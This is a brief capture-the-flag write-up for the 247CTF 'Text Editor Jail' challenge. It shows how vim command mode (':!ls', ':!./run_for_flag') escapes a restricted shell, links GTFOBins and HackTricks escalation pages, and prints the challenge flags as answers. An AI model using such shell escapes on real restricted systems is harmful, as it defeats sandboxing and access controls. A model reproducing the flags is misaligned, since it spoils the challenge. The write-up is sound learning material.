# Misc: The Text Editor Jail

## Previous Flag
```
247CTF{61f66e2b26507d2498f78b4a77665cb8}
```

## Goal
We didn't have time to setup and test a proper jail, so this text editor will have to do for now. Can you break free?

## What I learned
```
execute arbitrary shell commands inside VIM via command mode
:ls             to do commands inside vim vulnerability

GTFOBins: https://gtfobins.github.io/gtfobins/vim/
HackTricks: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
```

## Solution
```
START CHALLENGE

https://9b0b2c5209e9bf4c.247ctf.com/
Opens up VIM

:!ls -la ⌨️
ENTER or type command to continue
total 828
drwxr-sr-x    1 notroot  notroot         26 Aug 18  2019 .
drwxr-xr-x    1 root     root            21 Aug  6  2019 ..
-rwxrwxr-x    1 notroot  notroot     844704 Jul 30  2019 run_for_flag 👀

:!./run_for_flag ⌨️
Press ENTER or type command to continue
247CTF{c69287be15653ac9ab47dcd3f2fcd8fa} 🔐
```

## Flag
247CTF{c69287be15653ac9ab47dcd3f2fcd8fa}

## Continue
[Continue](../247ctf/MiscAnImpossibleNumber.md)